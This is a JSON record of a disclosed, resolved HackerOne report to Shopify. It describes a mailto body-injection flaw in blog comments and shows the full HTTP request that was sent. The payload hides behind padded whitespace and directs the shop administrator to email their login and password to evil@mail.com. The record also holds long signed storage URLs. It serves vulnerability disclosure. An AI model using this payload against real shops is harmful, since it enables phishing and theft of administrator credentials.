@@ -1,0 +1,116 @@
+{
+  "id": 72976,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Mjk3Ng==",
+  "url": "https://hackerone.com/reports/72976",
+  "title": "Body injection in mailto link while commenting shop blog",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-06-28T13:19:42.550Z",
+  "submitted_at": "2015-06-28T13:19:42.550Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "skavans",
+    "url": "/skavans",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2015-09-10T16:41:08.997Z",
+  "bug_reporter_agreed_on_going_public_at": "2015-09-10T15:55:45.119Z",
+  "team_member_agreed_on_going_public_at": "2015-09-10T16:41:06.159Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "While commenting shop blog an attacker can inject a body attribute in email so it will be interpreted by shop administrator email-client. Attacker can make the request below to send the malicious comment:\r\n\r\n```http\r\nPOST /blogs/news/18286141-first-post/comments HTTP/1.1\r\nHost: test-4579.myshopify.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nCookie: <COOKIES_HERE>\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 926\r\n\r\ncomment%5Bauthor%5D=testxss&comment%5Bemail%5D=Reply%c2%a0customer%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%3Fbody%3DTo%c2%a0identify%c2%a0you%c2%a0as%c2%a0shop%c2%a0administrator%c2%a0please%c2%a0enter%c2%a0your%c2%a0login:%c2%a0________%c2%a0and%c2%a0password:%c2%a0________%c2%a0and%c2%a0send%c2%a0a%c2%a0letter%26to%3Devil@mail.com&comment%5Bbody%5D=gyjghhj\r\n```\r\n\r\nSo after that the shop administrator will see this comment as present on screen1.  If the administrator device has small screen he will not see the link payload.\r\nWhen administrator clicks the link to reply customer his email client will interpret the malicious body argument so the message will look like presented in screen2. So an attacker can steal the sensitive info using social engineering.\r\n",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 43248,
+      "file_name": "screen1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/043/248/ba728095cf64f63c32f44a3740285b64827bf878/screen1.png?response-content-disposition=attachment%3B%20filename%3D%22screen1.png%22%3B%20filename%2A%3DUTF-8%27%27screen1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUMVLSKQQ%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T212240Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFq510j17eP3ZJ3lHgNedZzMTxSbYwLmbdcS0vJBigwoAiEAlqUx4JCCJGBV4%2FL4%2Fi57THHB6DdbaKXIytfwNwaaV1EqsgUINBADGgwwMTM2MTkyNzQ4NDkiDB0nys65R252OR9IjiqPBR0Dy%2FTV1TC6Q7kn4%2BPtwn4%2F0JLzBKGmfALW0P%2B4YFj2KoHb9lXJ3U2MFoDmEhcxgLF6hGlM%2Fy91ZsgCxUpyu3RlyXF1XplmGe%2FYjoDV7XNub4cktqGqdZWQDEEvSW2D1UADKRtTGyC5KQbh2kF84y9xqLmuhE4KvQ1lnReJxfCmBe4EMGEgOqOU7MPUHTQPQ9v4rumSw0mh5JV9z9XoVc%2FdnPa%2F9we0u96Yf4AGVI5JmOsgTdLVFdNZiSCAXYr47Gb0hPfq%2BvsNP%2Fnyo%2FvH2Dbhqhc6p2T96H%2FQgz41acmkjNvExtITqVIdclmRqlONv2FqiQzzjAdOnh7Yh7Dbnykg1lL0r%2FqXWiAwjMyErXjTjt8LqdUi2HgA23bh9HFDod0ywjYc2iPjMic98f1tPQF%2BaFq%2BG5a1QvcarbiA6XjbiWhuirWsrBQYDdPxPM6ut3wdlocfI6Hv0IyCxgmQ8933OULG0WgxuVahygQ6OyuwE5wQLszj9ya4f3fpUh9W8936TQwPlkqDu2R%2FEKbFV3lbYvfQDpZB2oZUFbVUK1M6RM4mLnmN7%2BA2HLh61e1b8lefu%2BtnDsP0a6qDIBu7PBtsSwk9gmlfa30Q%2B3kJU4H96fz7M0ZxkRJ%2BzJJzvipUG3NEfZS%2BAOT5DCloC5kfzeqKfKZB09Zj4tLi9u2zE08H3sjy9dTyQBuNIuc0qB%2FISsjQdEYkwb%2FrAflvMkRKsLhjoLYAfaXyq3eK1lkloLSKKlatvjsKgqUJMN8jepv%2F5VjFAYPZxU%2B61RlyH9rTqLwNIB0XarzIWdksf6Wo4%2F1%2BQHIX9txBce4DPor%2BJs9rY%2FINal2TC5pkkMC9wqnQDj1p%2Fqojaoyh75ugJUCP1LMwzMPGxgY6sQE%2F8sJWiRlzFIvVqiEqs5Hu4P75qRvCIvEP3al4QPaZKTmLx6JU5Eh6%2BxU0X0xfMm3rqIeHgnvM2O88VdMWDo6MdB3DwoadMAwXOHwHLq0D%2FKFi8slaR%2F0R9pOb4eWj3aARbSvu89o3VxvFJSAI%2B%2F3Y%2BsFhwoztYbsuPP8FNGCLC2FtuHy17epxFf6N7s8EuV0%2B%2Bxbl5kDUSAmR2%2FGcscMX4b11hhTPT5Bl%2F6GbWrZEkaI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5aa1eb9a821fb05c16d803815a41735b6435954646151207c19e822506c0b2f4",
+      "file_size": 58532,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 43250,
+      "file_name": "screen2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/043/250/aae0c3f95c8368246fdccf7d44eaab189b2726aa/screen2.png?response-content-disposition=attachment%3B%20filename%3D%22screen2.png%22%3B%20filename%2A%3DUTF-8%27%27screen2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUMVLSKQQ%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T212240Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFq510j17eP3ZJ3lHgNedZzMTxSbYwLmbdcS0vJBigwoAiEAlqUx4JCCJGBV4%2FL4%2Fi57THHB6DdbaKXIytfwNwaaV1EqsgUINBADGgwwMTM2MTkyNzQ4NDkiDB0nys65R252OR9IjiqPBR0Dy%2FTV1TC6Q7kn4%2BPtwn4%2F0JLzBKGmfALW0P%2B4YFj2KoHb9lXJ3U2MFoDmEhcxgLF6hGlM%2Fy91ZsgCxUpyu3RlyXF1XplmGe%2FYjoDV7XNub4cktqGqdZWQDEEvSW2D1UADKRtTGyC5KQbh2kF84y9xqLmuhE4KvQ1lnReJxfCmBe4EMGEgOqOU7MPUHTQPQ9v4rumSw0mh5JV9z9XoVc%2FdnPa%2F9we0u96Yf4AGVI5JmOsgTdLVFdNZiSCAXYr47Gb0hPfq%2BvsNP%2Fnyo%2FvH2Dbhqhc6p2T96H%2FQgz41acmkjNvExtITqVIdclmRqlONv2FqiQzzjAdOnh7Yh7Dbnykg1lL0r%2FqXWiAwjMyErXjTjt8LqdUi2HgA23bh9HFDod0ywjYc2iPjMic98f1tPQF%2BaFq%2BG5a1QvcarbiA6XjbiWhuirWsrBQYDdPxPM6ut3wdlocfI6Hv0IyCxgmQ8933OULG0WgxuVahygQ6OyuwE5wQLszj9ya4f3fpUh9W8936TQwPlkqDu2R%2FEKbFV3lbYvfQDpZB2oZUFbVUK1M6RM4mLnmN7%2BA2HLh61e1b8lefu%2BtnDsP0a6qDIBu7PBtsSwk9gmlfa30Q%2B3kJU4H96fz7M0ZxkRJ%2BzJJzvipUG3NEfZS%2BAOT5DCloC5kfzeqKfKZB09Zj4tLi9u2zE08H3sjy9dTyQBuNIuc0qB%2FISsjQdEYkwb%2FrAflvMkRKsLhjoLYAfaXyq3eK1lkloLSKKlatvjsKgqUJMN8jepv%2F5VjFAYPZxU%2B61RlyH9rTqLwNIB0XarzIWdksf6Wo4%2F1%2BQHIX9txBce4DPor%2BJs9rY%2FINal2TC5pkkMC9wqnQDj1p%2Fqojaoyh75ugJUCP1LMwzMPGxgY6sQE%2F8sJWiRlzFIvVqiEqs5Hu4P75qRvCIvEP3al4QPaZKTmLx6JU5Eh6%2BxU0X0xfMm3rqIeHgnvM2O88VdMWDo6MdB3DwoadMAwXOHwHLq0D%2FKFi8slaR%2F0R9pOb4eWj3aARbSvu89o3VxvFJSAI%2B%2F3Y%2BsFhwoztYbsuPP8FNGCLC2FtuHy17epxFf6N7s8EuV0%2B%2Bxbl5kDUSAmR2%2FGcscMX4b11hhTPT5Bl%2F6GbWrZEkaI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3b82fe40134eb55d86382f0074703644a711d0e83d49b272342f7cf449b1909f",
+      "file_size": 44977,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2015-10-10T15:55:45.339Z",
+  "allow_singular_disclosure_after": -314083614.71088856,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "sw33tlie",
+    "shivammusic"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
